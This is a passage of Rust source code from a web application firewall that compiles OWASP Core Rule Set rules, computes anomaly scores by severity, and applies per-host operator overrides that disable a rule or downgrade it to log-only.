    /// value is one parameter, not the surface it came from.
    fn bind<'v>(&self, hit: Cow<'v, str>, state: &mut ChainState<'v>) {
        if self.capture
            && let CompiledMatcher::Regex(re) = &self.matcher
            && let Some(groups) = re.captures(&hit)
        {
            state.captures = groups
                .iter()
                .map(|group| group.map_or_else(String::new, |m| m.as_str().to_owned()))
                .collect();
        }
        state.matched = vec![hit];
    }

    /// Evaluate inside a chain, threading `state` forward.
    ///
    /// Returns `false` as soon as no value satisfies the condition, so the
    /// remaining links are never evaluated.
    ///
    /// What is recorded in `state` is the **transformed** text, because that is
    /// what `ModSecurity` puts in `MATCHED_VARS` and `TX:N`: a later link must
    /// see what its predecessor actually matched.
    fn advance<'v>(&self, view: &'v RequestView<'_>, state: &mut ChainState<'v>) -> bool {
        let subjects: Vec<Cow<'v, str>> = match &self.field {
            CondField::Request(field) => field.collect_values(view),
            CondField::MatchedValue => std::mem::take(&mut state.matched),
            CondField::Capture(n) => state
                .captures
                .get(usize::from(*n))
                .cloned()
                .map(Cow::Owned)
                .into_iter()
                .collect(),
        };

        let mut hits: Vec<Cow<'v, str>> = Vec::new();
        for value in subjects {
            // `apply` yields an owned `String` or nothing, so the untransformed
            // subject can be moved into `hits` without keeping a borrow alive.
            let subject: Cow<'v, str> = self.transform.apply(&value).map_or(value, Cow::Owned);
            match (self.matcher.test(&subject, view.ctx, state), self.negate) {
                (Outcome::Match, false) | (Outcome::NoMatch, true) => hits.push(subject),
                _ => {}
            }
        }
        let Some(first) = hits.first() else {
            return false;
        };

        if self.capture
            && let CompiledMatcher::Regex(re) = &self.matcher
            && let Some(groups) = re.captures(first)
        {
            state.captures = groups
                .iter()
                .map(|group| group.map_or_else(String::new, |m| m.as_str().to_owned()))
                .collect();
        }
        state.matched = hits;
        true
    }
}

/// The four `ModSecurity` severities CRS actually uses, in the order that
/// decides how much a matching rule contributes to the anomaly score.
///
/// Upstream pairs each one with a fixed `tx.*_anomaly_score` variable — the
/// pairing is not a convention, it is exhaustive across all 625 rules of CRS
/// v4.25.0: every `severity:'CRITICAL'` rule adds `%{tx.critical_anomaly_score}`,
/// every `severity:'WARNING'` rule adds `%{tx.warning_anomaly_score}`, and so
/// on, with no cross terms.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    /// `severity:'NOTICE'` — upstream weight 2.
    Notice,
    /// `severity:'WARNING'` — upstream weight 3.
    Warning,
    /// `severity:'ERROR'` — upstream weight 4.
    Error,
    /// `severity:'CRITICAL'` — upstream weight 5.
    Critical,
}

impl Severity {
    /// Parse the `severity:` field of a rule.
    ///
    /// The four CRS names are the canonical spellings. `high` / `medium` /
    /// `low` are accepted because an earlier generation of the converter
    /// emitted them for the response-phase rule files (`high` was its rendering
    /// of upstream `ERROR`); they map onto the CRS scale rather than being
    /// silently dropped.
    ///
    /// Returns `None` for anything else so the caller can decide — and record —
    /// what an unrecognised severity means, instead of guessing quietly.
    fn parse(name: &str) -> Option<Self> {
        match name.trim().to_ascii_lowercase().as_str() {
            "critical" | "emergency" | "alert" => Some(Self::Critical),
            "error" | "high" => Some(Self::Error),
            "warning" | "medium" => Some(Self::Warning),
            "notice" | "info" | "debug" | "low" => Some(Self::Notice),
            _ => None,
        }
    }

    /// Canonical CRS spelling, used in operator-facing diagnostics.
    const fn label(self) -> &'static str {
        match self {
            Self::Critical => "critical",
            Self::Error => "error",
            Self::Warning => "warning",
            Self::Notice => "notice",
        }
    }
}

/// What a matching rule does, mirroring the `ModSecurity` disruptive actions
/// CRS actually uses.
///
/// The distinction is the whole point of the scoring model and it is easy to
/// get backwards: in `ModSecurity` the `block` keyword does **not** mean
/// "deny". It means "apply whatever `SecDefaultAction` says", and CRS ships
/// `SecDefaultAction "phase:2,log,auditlog,pass"`, so a `block` rule
/// contributes its severity to the anomaly score and lets the request
/// continue. Only `deny` is unconditional, and across CRS v4.25.0 exactly six
/// rules use it — `901001`, `901500` (configuration errors) and the four
/// blocking-evaluation rules `949110` / `949111` / `959100` / `959101`, which
/// are the threshold comparison itself.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum RuleAction {
    /// `block` upstream: add this rule's severity score, keep evaluating.
    Score,
    /// `deny` upstream: block immediately, whatever the score is. Reserved for
    /// hand-written rules that must be unconditional (CVE virtual patches);
    /// no converted CRS rule carries it.
    Deny,
    /// `log` / `pass` upstream: record the match, contribute nothing.
    Log,
}

impl RuleAction {
    fn parse(name: &str) -> Option<Self> {
        match name.trim().to_ascii_lowercase().as_str() {
            "block" | "score" => Some(Self::Score),
            "deny" | "drop" | "reject" => Some(Self::Deny),
            "log" | "pass" | "alert" => Some(Self::Log),
            _ => None,
        }
    }

    /// Canonical spelling for the admin API, the CLI and diagnostics.
    ///
    /// `score` rather than `block` on purpose: `block` is upstream's word for
    /// "do what `SecDefaultAction` says", and rendering it in an operator-facing
    /// list is what makes people read a scoring rule as an unconditional deny.
    const fn label(self) -> &'static str {
        match self {
            Self::Score => "score",
            Self::Deny => "deny",
            Self::Log => "log",
        }
    }
}

// ── Operator rule overrides ───────────────────────────────────────────────────

/// What an operator has done to one loaded CRS rule.
///
/// This is the *effective* state the request path reads, already resolved from
/// the `rule_overrides` row. Deliberately three states and not a bool: "off" and
/// "on but recorded only" are different postures, and collapsing them is how a
/// tuning exercise turns into a hole nobody can see.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum RuleState {
    /// No override, or one that restores the rule's declared behaviour.
    #[default]
    Active,
    /// The rule is not evaluated at all. It cannot match, cannot score and
    /// cannot appear in any log — this is a hole in the rule set by definition.
    Disabled,
    /// The rule is still evaluated and every match is written to the audit log,
    /// but it contributes **nothing** to the anomaly score, so it can no longer
    /// block on its own or help another rule reach the threshold.
    LogOnly,
}

impl RuleState {
    /// Canonical spelling for the API, the CLI and log lines.
    #[must_use]
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Active => "active",
            Self::Disabled => "disabled",
            Self::LogOnly => "log_only",
        }
    }

    /// Resolve a `rule_overrides` row into the state the request path applies.
    ///
    /// Shared by the write path (so the API can refuse a row that means nothing
    /// *before* it is stored) and the load path (so a row written straight into
    /// the database is read the same way). The two cannot drift.
    ///
    /// Precedence is `enabled = false` first: a row that both switches a rule
    /// off and asks for an action is contradictory, and the safe reading of a
    /// contradiction is the one that does not leave a rule scoring when the
    /// operator believed it was off. [`Self::from_row`] reports that case so the
    /// API can reject it outright rather than pick for the operator.
    pub fn from_row(enabled: Option<bool>, action_override: Option<&str>) -> Result<Self, RuleOverrideError> {
        let action = match action_override.map(str::trim).filter(|a| !a.is_empty()) {
            None => None,
            Some(a) => Some(match a.to_ascii_lowercase().as_str() {
                "log" | "pass" => Self::LogOnly,
                // The declared action, whatever it is, is restored. This is what
                // lets a per-host row cancel a global downgrade.
                "block" | "score" => Self::Active,
                _ => return Err(RuleOverrideError::UnsupportedAction(a.to_owned())),
            }),
        };
        match (enabled, action) {
            (Some(false), None) => Ok(Self::Disabled),
            (Some(false), Some(_)) => Err(RuleOverrideError::Contradictory),
            (_, Some(state)) => Ok(state),
            (Some(true), None) => Ok(Self::Active),
            (None, None) => Err(RuleOverrideError::Empty),
        }
    }
}

/// Why a `rule_overrides` row cannot be turned into a [`RuleState`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RuleOverrideError {
    /// `action_override` names something the request path cannot carry out.
    UnsupportedAction(String),
    /// The row switches the rule off *and* asks for an action.
    Contradictory,
    /// Both `enabled` and `action_override` are null — the row changes nothing.
    Empty,
}

impl fmt::Display for RuleOverrideError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::UnsupportedAction(a) => write!(
                f,
                "unsupported action_override {a:?}: only \"log\" (evaluate and record, contribute no \
                 score) and \"block\" (restore the rule's declared action) are implemented"
            ),
            Self::Contradictory => write!(
                f,
                "enabled = false together with an action_override is contradictory: a rule that is \
                 not evaluated cannot carry out an action"
            ),
            Self::Empty => write!(
                f,
                "the override sets neither enabled nor action_override, so it would change nothing"
            ),
        }
    }
}

impl std::error::Error for RuleOverrideError {}

/// One `rule_overrides` row, as handed to [`OWASPCheck::load_overrides`].
#[derive(Debug, Clone)]
pub struct RuleOverrideSpec {
    /// The rule this applies to, as `CRS-942100` or bare `942100`.
    pub rule_id: String,
    /// `HostConfig::code` this override is scoped to, or `None` for every host.
    pub host_code: Option<String>,
    /// The effective state, already resolved by [`RuleState::from_row`].
    pub state: RuleState,
}

/// Effective state of every loaded rule, for one scope.
///
/// Two dense slices indexed by the rule's position in [`OWASPCheck::rules`] /
/// [`OWASPCheck::response_rules`]. Not a map: the request path needs the state
/// of *every* rule it walks, so a direct index is one bounds check where a hash
/// lookup would be a hash plus a probe, 288 times per request.
struct RuleStates {
    request: Box<[RuleState]>,
    response: Box<[RuleState]>,
}

impl RuleStates {
    fn active(request: usize, response: usize) -> Self {
        Self {
            request: vec![RuleState::Active; request].into_boxed_slice(),
            response: vec![RuleState::Active; response].into_boxed_slice(),
        }
    }

    fn set(&mut self, index: RuleIndex, state: RuleState) {
        let slice = if index.response {
            &mut self.response
        } else {
            &mut self.request
        };
        if let Some(slot) = slice.get_mut(index.position) {
            *slot = state;
        }
    }

    fn counts(&self) -> (usize, usize) {
        let all = self.request.iter().chain(self.response.iter());
        all.fold((0, 0), |(disabled, log_only), state| match state {
            RuleState::Disabled => (disabled.saturating_add(1), log_only),
            RuleState::LogOnly => (disabled, log_only.saturating_add(1)),
            RuleState::Active => (disabled, log_only),
        })
    }
}

impl Clone for RuleStates {
    fn clone(&self) -> Self {
        Self {
            request: self.request.clone(),
            response: self.response.clone(),
        }
    }
}

/// The published override snapshot the request path reads.
struct OverrideSnapshot {
    /// Applies to every host that has no rows of its own.
    global: RuleStates,
    /// `HostConfig::code` → that host's states, with the global layer already
    /// folded in at load time. Empty in the common case, and then never probed.
    per_host: HashMap<String, RuleStates>,
}

impl OverrideSnapshot {
    /// The states governing `host_code`. One hash lookup, and not even that when
    /// no host-scoped override exists.
    fn for_host(&self, host_code: &str) -> &RuleStates {
        if self.per_host.is_empty() {
            return &self.global;
        }
        self.per_host.get(host_code).unwrap_or(&self.global)
    }
}

/// Where one rule lives inside [`OWASPCheck`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct RuleIndex {
    /// `true` for [`OWASPCheck::response_rules`], `false` for the request half.
    response: bool,
    position: usize,
}

/// Outcome of an [`OWASPCheck::load_overrides`] call.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct OverrideLoadReport {
    /// Overrides now on the request path.
    pub applied: usize,
    /// Rule ids that are not in the loaded set. Their rows are inert; the
    /// operator is told so rather than left believing a typo took effect.
    pub unknown_rule_ids: Vec<String>,
    /// Rules switched off in at least one scope.
    pub disabled: usize,
    /// Rules downgraded to record-only in at least one scope.
    pub log_only: usize,
    /// Hosts carrying at least one host-scoped override.
    pub hosts: usize,
}

/// One loaded CRS rule, as the admin API and the CLI need to show it.
///
/// Built on demand from the compiled rule and its load-time metadata, so the
/// list an operator reads is by construction the list the request path runs —
/// there is no second registry to fall out of step.
#[derive(Debug, Clone)]
pub struct RuleDescriptor {
    /// Engine rule id (`CRS-942100`).
    pub id: String,
    /// Upstream numeric `SecRule` id, when the source declares one.
    pub crs_id: Option<u32>,
    /// Rule name / `msg`.
    pub name: String,
    /// Attack class from the rule file (`sqli`, `xss`, …).
    pub category: String,
    /// File the rule was loaded from.
    pub source: String,
    /// CRS severity label (`critical` / `error` / `warning` / `notice`).
    pub severity: &'static str,
    /// Anomaly score a match adds at the configured weights, before any
    /// override. `0` for a rule whose declared action is `log`.
    pub score: u32,
    /// Minimum `owasp_paranoia` at which this rule is evaluated.
    pub paranoia: u8,
    /// `request` or `response`.
    pub phase: &'static str,
    /// What the rule file declares (`score` / `deny` / `log`).
    pub declared_action: &'static str,
    /// The operator override in force for the queried scope.
    pub state: RuleState,
}

/// The severity-to-score map and the blocking threshold, resolved once at load
/// time from [`OwaspConfig`].
///
/// Held by value inside [`OWASPCheck`] so the request path reads plain `u32`s
/// with no indirection and no lock.
#[derive(Debug, Clone, Copy)]
struct AnomalyScoring {
    enabled: bool,
    critical: u32,
    error: u32,
    warning: u32,
    notice: u32,
    inbound_threshold: u32,
    /// The response-phase threshold (`tx.outbound_anomaly_score_threshold`,
    /// upstream 4). Deliberately a second number: see
    /// [`OwaspConfig::outbound_anomaly_score_threshold`].
    outbound_threshold: u32,
}

impl AnomalyScoring {
    const fn score_for(self, severity: Severity) -> u32 {
        match severity {
            Severity::Critical => self.critical,
            Severity::Error => self.error,
            Severity::Warning => self.warning,
            Severity::Notice => self.notice,
        }
    }

    /// `true` when one rule of this severity reaches the threshold on its own.
    const fn blocks_alone(self, severity: Severity) -> bool {
        self.score_for(severity) >= self.inbound_threshold
    }

    /// The response-phase counterpart of [`Self::blocks_alone`].
    ///
    /// With the shipped numbers this is true of `error` and `critical` — which
    /// is upstream's behaviour, not a local decision: the CRS response rules are
    /// all `ERROR` or `CRITICAL` and the outbound threshold is 4.
    const fn condemns_alone(self, severity: Severity) -> bool {
        self.score_for(severity) >= self.outbound_threshold
    }
}

impl From<&OwaspConfig> for AnomalyScoring {
    fn from(cfg: &OwaspConfig) -> Self {
        Self {
            enabled: cfg.anomaly_scoring,
            critical: cfg.critical_anomaly_score,
            error: cfg.error_anomaly_score,
            warning: cfg.warning_anomaly_score,
            notice: cfg.notice_anomaly_score,
            // A zero threshold is rejected by `OwaspConfig::validate`, but this
            // type is also reachable from `Default`, so clamp rather than trust:
            // 0 would be reached by a request that matched nothing at all.
            inbound_threshold: cfg.inbound_anomaly_score_threshold.max(1),
            outbound_threshold: cfg.outbound_anomaly_score_threshold.max(1),
        }
    }
}

impl Default for AnomalyScoring {
    fn default() -> Self {
        Self::from(&OwaspConfig::default())
    }
}

/// One rule that matched a request.
///
/// Named for the common case, but it also carries the matches that contribute
/// *nothing*: a rule whose declared action is `log`, and a rule an operator
/// downgraded to [`RuleState::LogOnly`]. Those are recorded — that is the whole
/// point of a log-only rule — and excluded from every arithmetic and every
/// operator-facing "N rule(s) contributed" count by [`Self::scored`].
struct Contribution<'r> {
    id: &'r str,
    /// Upstream numeric CRS id, when the rule declares one. See
    /// [`CompiledRule::crs_id`].
    crs_id: Option<u32>,
    name: &'r str,
    severity: Severity,
    score: u32,
    /// `false` for a record-only match: it is written to the audit log and
    /// nowhere else.
    scored: bool,
}

/// Outcome of walking one phase's rule list.
enum Evaluation<'r> {
    /// Every in-scope rule was evaluated; `score` is the total the threshold is
    /// compared against.
    Scored {
        score: u32,
        contributions: Vec<Contribution<'r>>,
    },
    /// A rule with `action: deny` matched, which settles the verdict on its own.
    /// The walk stopped there, so `contributions` is what had been recorded up
    /// to and including it.
    Denied {
        rule: &'r CompiledRule,
        contributions: Vec<Contribution<'r>>,
    },
}

struct CompiledRule {
    id: String,
    /// The upstream `SecRule` id (`942100`) behind [`Self::id`]
    /// (`CRS-942100`), when the source file declares one.
    crs_id: Option<u32>,
    name: String,
    paranoia: u8,
    head: Condition,
    /// Additional conditions that must all hold (`ModSecurity` `chain`).
    /// Empty for an ordinary rule.
    chain: Vec<Condition>,
    /// Weight this rule adds to the inbound anomaly score when it matches.
    severity: Severity,
    /// Whether a match scores, denies outright, or is recorded only.
    action: RuleAction,
}

impl CompiledRule {
    /// `true` when any condition of this rule reads a response surface.
    ///
    /// Such a rule belongs to the response pipeline and to nothing else: in the
    /// request phase its response conditions read `None`, so it can neither
    /// match nor be usefully evaluated there. The chain is inspected as well as
    /// the head, because a rule whose head is `RESPONSE_STATUS`-free but which
    /// chains a `RESPONSE_BODY` link is still a `phase:4` rule.
    fn reads_response(&self) -> bool {
        let reads = |condition: &Condition| match &condition.field {
            CondField::Request(field) => field.is_response(),
            CondField::MatchedValue | CondField::Capture(_) => false,
        };
        reads(&self.head) || self.chain.iter().any(reads)
    }

    /// `true` when some value of the head's field satisfies the head **and**
    /// carries the whole chain.
    ///
    /// The chain is evaluated **once per matching head value**, not once for
    /// all of them together.  That is what `ARGS` means: upstream runs the rule
    /// against one parameter at a time, so `MATCHED_VARS` and `TX:N` inside the
    /// chain describe *that* parameter.  Evaluating the chain once against the
    /// union is what broke CRS-942440's `^(?:JWT|token)$` exemption — the
    /// exemption can only ever be true of a single parameter value, never of a
    /// whole query string — and what made CRS-942130's capture equality read
    /// the `name=value` separator of an unrelated parameter.
    ///
    /// For a single-valued head this is one iteration, i.e. exactly the old
    /// behaviour.
    fn matches(&self, view: &RequestView<'_>) -> bool {
        // The cheap short-circuiting test runs first for every rule, chained or
        // not, so ordinary traffic pays exactly what it paid before chains
        // existed.  Only a request that already satisfies the head is walked a
        // second time to record which values matched.
        if !self.head.matches_any(view) {
            return false;
        }
        if self.chain.is_empty() {
            return true;
        }
        self.head.hits(view).into_iter().any(|hit| {
            let mut state = ChainState::default();
            self.head.bind(hit, &mut state);
            self.chain.iter().all(|link| link.advance(view, &mut state))
        })
    }
}

// ── Loader ────────────────────────────────────────────────────────────────────

/// Wordlist load outcome, cached per file name so a failure is reported the
/// same way for every rule referencing it and a success is compiled once.
type WordlistResult = Result<Arc<AhoCorasick>, String>;

/// Load-time metadata that the request path never reads.
///
/// Held in a vector parallel to the compiled rules rather than inside
/// [`CompiledRule`], so the struct the hot loop walks does not grow two more
/// pointers per rule for the sake of an admin listing.
struct RuleMeta {
    category: Box<str>,
    /// The file the rule came from. `Arc` because one file contributes tens of
    /// rules and the string is only ever read.
    source: Arc<str>,
}

struct Loader {
    rules: Vec<(CompiledRule, RuleMeta)>,
    summary: LoadSummary,
    /// Directory holding `pm_from_file` wordlists; `None` when the rules did
    /// not come from a directory (in that case `pm_from_file` is rejected
    /// rather than silently skipped).
    data_dir: Option<PathBuf>,
    wordlists: HashMap<String, WordlistResult>,
    /// Distinct `t:` chains seen so far, so equal chains share one id and one
    /// memo slot per request.
    chain_ids: HashMap<Vec<Transform>, u32>,
}

impl Loader {
    fn new(data_dir: Option<PathBuf>) -> Self {
        Self {
            rules: Vec::new(),
            summary: LoadSummary::default(),
            data_dir,
            wordlists: HashMap::new(),
            chain_ids: HashMap::new(),
        }
    }

    /// Resolve a declared `t:` list to an interned chain.
    fn transform_chain(&mut self, position: &str, names: &[String]) -> Result<TransformChain, RejectReason> {
        let steps = TransformChain::parse_steps(position, names)?;
        let next = u32::try_from(self.chain_ids.len()).unwrap_or(TransformChain::UNINTERNED);
        let id = *self.chain_ids.entry(steps.clone()).or_insert(next);
        Ok(TransformChain {
            id,
            steps: steps.into_boxed_slice(),
        })
    }

    fn push_source_error(&mut self, source: String, error: String) {
        self.summary.source_errors.push(SourceError { source, error });
    }

    fn add_source(&mut self, source: &str, content: &str) {
        let ruleset: RuleSet = match serde_yaml::from_str(content) {
            Ok(parsed) => parsed,
            Err(e) => {
                self.push_source_error(source.to_owned(), e.to_string());
                return;
            }
        };

        let origin: Arc<str> = Arc::from(source);
        for rule in ruleset.rules {
            self.summary.attempted = self.summary.attempted.saturating_add(1);
            let rule_id = rule.id.clone();
            let category = Box::from(rule.category.as_str());
            match self.compile(rule) {
                Ok(compiled) => self.rules.push((
                    compiled,
                    RuleMeta {
                        category,
                        source: Arc::clone(&origin),
                    },
                )),
                Err(reason) => self.summary.rejected.push(RejectedRule {
                    rule_id,
                    source: source.to_owned(),
                    reason,
                }),
            }
        }
        self.summary.compiled = self.rules.len();
    }

    fn compile(&mut self, rule: YamlRule) -> Result<CompiledRule, RejectReason> {
        // `capture` binds tx:0..tx:N for the conditions that follow; the count
        // is carried forward so a `tx:N` read that nothing produces is rejected
        // at load time instead of never matching at runtime.
        let mut bound_captures = 0usize;

        // `matched_value` / `tx:N` read what an earlier condition produced, so
        // they mean nothing as the head of a rule.
        if !matches!(parse_cond_field(&rule.field), Some(CondField::Request(_))) {
            return Err(RejectReason::UnsupportedField(rule.field.clone()));
        }
        let head = self.compile_condition(
            "head",
            &rule.field,
            &rule.operator,
            &rule.value,
            &rule.transform,
            rule.negate,
            rule.capture,
            &mut bound_captures,
        )?;

        let mut chain = Vec::with_capacity(rule.chain.len());
        for (index, link) in rule.chain.iter().enumerate() {
            let position = format!("chain[{index}]");
            let condition = self
                .compile_condition(
                    &position,
                    &link.field,
                    &link.operator,
                    &link.value,
                    &link.transform,
                    link.negate,
                    link.capture,
                    &mut bound_captures,
                )
                .map_err(|reason| match reason {
                    already @ (RejectReason::Chain { .. }
                    | RejectReason::CaptureWithoutRegex { .. }
                    | RejectReason::UnsupportedTransformation { .. }
                    | RejectReason::UnresolvedCapture { .. }) => already,
                    inner => RejectReason::Chain {
                        position: position.clone(),
                        detail: inner.to_string(),
                    },
                })?;
            chain.push(condition);
        }

        // Severity and action decide *how* a match is enforced, so an
        // unreadable value must not silently pick a weaker enforcement. Both
        // fall back to the strongest CRS-compatible reading and are recorded.
        let severity = Severity::parse(&rule.severity).unwrap_or_else(|| {
            self.summary.severity_defaulted.push(rule.id.clone());
            Severity::Critical
        });
        let action = RuleAction::parse(&rule.action).unwrap_or_else(|| {
            self.summary.action_defaulted.push(rule.id.clone());
            RuleAction::Score
        });

        // A file that predates `crs_id` still yields the upstream id, because
        // the converter has always written it into `id` as `CRS-<n>`.
        let crs_id = rule
            .crs_id
            .or_else(|| rule.id.strip_prefix("CRS-").and_then(|n| n.parse::<u32>().ok()));

        Ok(CompiledRule {
            id: rule.id,
            crs_id,
            name: rule.name,
            paranoia: rule.paranoia,
            head,
            chain,
            severity,
            action,
        })
    }

    /// Compile one condition — the head or one chain link.
    ///
    /// `bound_captures` is the number of `tx:` slots the preceding conditions
    /// bound (0 when nothing captured yet); it is updated in place when this
    /// condition declares `capture`.
    #[allow(clippy::too_many_arguments)]
    fn compile_condition(
        &mut self,
        position: &str,
        field_name: &str,
        operator: &str,
        value: &YamlValue,
        transform: &[String],
        negate: bool,
        capture: bool,
        bound_captures: &mut usize,
    ) -> Result<Condition, RejectReason> {
        // Validate the field *before* the operator: an unreadable field makes
        // the condition unevaluable no matter which matcher it asks for.
        let field =
            parse_cond_field(field_name).ok_or_else(|| RejectReason::UnsupportedField(field_name.to_owned()))?;
        if let CondField::Capture(index) = field
            && usize::from(index) >= *bound_captures
        {
            return Err(RejectReason::UnresolvedCapture {
                position: position.to_owned(),
                index,
            });
        }

        // The transformation chain is resolved before the matcher: a rule whose
        // pattern was written against a value this engine cannot produce is not
        // a rule this engine can enforce, whatever its operator.
        let transform = self.transform_chain(position, transform)?;

        // Scalar comparisons stay restricted to single-valued request fields:
        // the schema cannot express the CRS collection-member selector, so
        // `equals` on `cookies` would silently mean "any cookie".  Chain
        // pseudo-fields are exempt — they are single values by construction.
        if let CondField::Request(request_field) = &field
            && matches!(operator, "equals" | "not_in" | "gt" | "lt")
            && !request_field.is_scalar()
        {
            return Err(RejectReason::NonScalarField {
                operator: operator.to_owned(),
                field: field_name.to_owned(),
            });
        }

        let operand = |op: &str| -> Result<Operand, RejectReason> {
            let raw = str_value(value, op)?;
            Operand::parse(raw).ok_or_else(|| RejectReason::InvalidValueType {
                operator: op.to_owned(),
                expected: "literal or %{TX.N} / %{REQUEST_HEADERS.HOST} macro",
            })
        };

        let matcher = match operator {
            "regex" => {
                let pattern = str_value(value, operator)?;
                Regex::new(pattern)
                    .map(CompiledMatcher::Regex)
                    .map_err(|e| RejectReason::InvalidRegex(e.to_string()))?
            }
            "contains" => CompiledMatcher::Contains(operand(operator)?),
            "equals" => CompiledMatcher::Equals(operand(operator)?),
            "starts_with" => CompiledMatcher::StartsWith(operand(operator)?),
            "ends_with" => CompiledMatcher::EndsWith(operand(operator)?),
            "contains_any" => CompiledMatcher::MultiPattern(build_phrase_set(value, operator)?),
            "pm_from_file" => {
                let file = str_value(value, operator)?;
                CompiledMatcher::MultiPattern(self.wordlist(file)?)
            }
            "not_in" => {
                let YamlValue::List(list) = value else {
                    return Err(RejectReason::InvalidValueType {
                        operator: operator.to_owned(),
                        expected: "list of strings",
                    });
                };
                CompiledMatcher::NotIn(list.clone())
            }
            "gt" => CompiledMatcher::Gt(int_value(value, operator)?),
            "lt" => CompiledMatcher::Lt(int_value(value, operator)?),
            "detect_sqli" | "@detectSQLi" => CompiledMatcher::DetectSqli,
            "detect_xss" | "@detectXSS" => CompiledMatcher::DetectXss,
            other => return Err(RejectReason::UnsupportedOperator(other.to_owned())),
        };

        // A macro operand may only name a capture an earlier condition bound.
        if let Some(highest) = match &matcher {
            CompiledMatcher::Contains(operand)
            | CompiledMatcher::Equals(operand)
            | CompiledMatcher::StartsWith(operand)
            | CompiledMatcher::EndsWith(operand) => operand.max_capture(),
            _ => None,
        } && usize::from(highest) >= *bound_captures
        {
            return Err(RejectReason::UnresolvedCapture {
                position: position.to_owned(),
                index: highest,
            });
        }

        // A header count is 0 or 1 in this engine (repeated headers are folded
        // into one entry), so a comparison against anything else — or with any
        // other operator — could never be reached and is refused instead of
        // shipping a rule that never fires.
        if let CondField::Request(Field::HeaderCount(_)) = &field {
            let reachable = match &matcher {
                CompiledMatcher::Equals(operand) => matches!(operand.literal(), Some("0" | "1")),
                _ => false,
            };
            if !reachable {
                return Err(RejectReason::InvalidValueType {
                    operator: operator.to_owned(),
                    expected: "`equals` against '0' or '1' (a header count is presence-only here)",
                });
            }
        }

        if capture {
            let CompiledMatcher::Regex(re) = &matcher else {
                return Err(RejectReason::CaptureWithoutRegex {
                    position: position.to_owned(),
                });
            };
            *bound_captures = re.captures_len();
        }

        Ok(Condition {
            field,
            matcher,
            transform,
            negate,
            capture,
        })
    }

    /// Resolve a `pm_from_file` wordlist to a shared automaton.
    fn wordlist(&mut self, file: &str) -> Result<Arc<AhoCorasick>, RejectReason> {
        let reject = |error: String| RejectReason::DataFile {
            file: file.to_owned(),
            error,
        };

        // The name comes from a YAML file on disk: keep it a plain file name so
        // a rule can never reach outside the rule set's data directory.
        if file.is_empty() || file.contains('/') || file.contains('\\') || file.contains("..") {
            return Err(reject("not a plain file name".to_owned()));
        }

        if let Some(cached) = self.wordlists.get(file) {
            return cached.clone().map_err(reject);
        }

        let Some(dir) = self.data_dir.as_ref() else {
            return Err(reject("this rule source has no associated data directory".to_owned()));
        };

        let outcome = build_wordlist(&dir.join(file));
        self.wordlists.insert(file.to_owned(), outcome.clone());
        outcome.map_err(reject)
    }

    /// Split the compiled rules into the request pipeline and the response
    /// pipeline and hand both to the check.
    ///
    /// The partition happens once, at load time, so neither hot path ever walks
    /// a rule it structurally cannot evaluate: the request phase does not pay
    /// for the 58 `RESPONSE-95x` rules and the response phase does not pay for
    /// the ~200 request ones.
    fn finish(self, origin: &str) -> OWASPCheck {
        self.summary.report(origin);
        let mut rules = Vec::with_capacity(self.rules.len());
        let mut meta = Vec::with_capacity(self.rules.len());
        let mut response_rules = Vec::new();
        let mut response_meta = Vec::new();
        for (rule, rule_meta) in self.rules {
            if rule.reads_response() {
                response_rules.push(rule);
                response_meta.push(rule_meta);
            } else {
                rules.push(rule);
                meta.push(rule_meta);
            }
        }
        let by_id = build_rule_index(&rules, &response_rules);
        OWASPCheck {
            rules,
            response_rules,
            meta,
            response_meta,
            by_id,
            overrides: ArcSwapOption::empty(),
            summary: self.summary,
            scoring: AnomalyScoring::default(),
            audit: None,
        }
    }
}

/// Map every accepted spelling of a rule id onto its position.
///
/// Both the engine id (`CRS-942100`) and the bare upstream number (`942100`)
/// resolve, because an operator reading a CRS advisory has the number and an
/// operator reading our own logs has the prefixed form; requiring the right one
/// would make `rules disable 942100` a silent no-op.
///
/// A duplicate id is refused rather than overwritten: with two rules answering
/// to one name an override would apply to whichever the loader happened to see
/// first, which is the sort of ambiguity that is only ever discovered during an
/// incident.
fn build_rule_index(rules: &[CompiledRule], response_rules: &[CompiledRule]) -> HashMap<Box<str>, RuleIndex> {
    let mut by_id: HashMap<Box<str>, Option<RuleIndex>> = HashMap::new();
    for (response, list) in [(false, rules), (true, response_rules)] {
        for (position, rule) in list.iter().enumerate() {
            let index = RuleIndex { response, position };
            let mut keys = vec![Box::<str>::from(rule.id.as_str())];
            if let Some(crs_id) = rule.crs_id {
                keys.push(Box::from(crs_id.to_string().as_str()));
            }
            for key in keys {
                match by_id.entry(key) {
                    std::collections::hash_map::Entry::Vacant(slot) => {
                        slot.insert(Some(index));
                    }
                    std::collections::hash_map::Entry::Occupied(mut slot) => {
                        if slot.get() != &Some(index) {
                            warn!(
                                "duplicate OWASP rule id {:?} in the loaded rule set — per-rule \
                                 overrides naming it are ambiguous and will be refused",
                                slot.key()
                            );
                            slot.insert(None);
                        }
                    }
                }
            }
        }
    }
    by_id
        .into_iter()
        .filter_map(|(key, index)| index.map(|index| (key, index)))
        .collect()
}

fn str_value<'a>(value: &'a YamlValue, operator: &str) -> Result<&'a str, RejectReason> {
    match value {
        YamlValue::Str(s) => Ok(s.as_str()),
        YamlValue::List(_) | YamlValue::Int(_) => Err(RejectReason::InvalidValueType {
            operator: operator.to_owned(),
            expected: "string",
        }),
    }
}

fn int_value(value: &YamlValue, operator: &str) -> Result<i64, RejectReason> {
    match value {
        YamlValue::Int(n) => Ok(*n),
        YamlValue::Str(_) | YamlValue::List(_) => Err(RejectReason::InvalidValueType {
            operator: operator.to_owned(),
            expected: "integer",
        }),
    }
}

/// Build the Aho-Corasick automaton for a `contains_any` (`@pm`) phrase set.
///
/// Accepts the CRS form (one whitespace-separated string of phrases) and a
/// YAML list of phrases.
fn build_phrase_set(value: &YamlValue, operator: &str) -> Result<Arc<AhoCorasick>, RejectReason> {
    let phrases: Vec<&str> = match value {
        YamlValue::Str(s) => s.split_whitespace().collect(),
        YamlValue::List(list) => list.iter().map(String::as_str).filter(|s| !s.is_empty()).collect(),
        YamlValue::Int(_) => {
